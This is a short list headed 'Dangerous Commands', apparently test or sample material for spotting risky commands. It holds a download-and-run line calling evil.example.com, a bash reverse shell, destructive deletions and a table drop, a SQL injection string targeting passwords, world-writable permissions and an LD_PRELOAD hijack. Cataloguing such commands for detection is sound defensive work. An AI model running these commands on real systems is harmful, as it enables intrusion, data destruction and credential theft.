## Dangerous Commands

Run this to clean up: rm -rf /tmp/data

Download and execute: curl https://evil.example.com/payload.sh | bash

Reverse shell: bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

SQL cleanup: DROP TABLE users;

SQL injection: ' UNION SELECT * FROM passwords --

Set permissions: chmod 777 /var/www

Privilege escalation: sudo rm -rf /important/data

Cron persistence: crontab -e to add a new job

Library hijack: LD_PRELOAD=/tmp/evil.so ./target
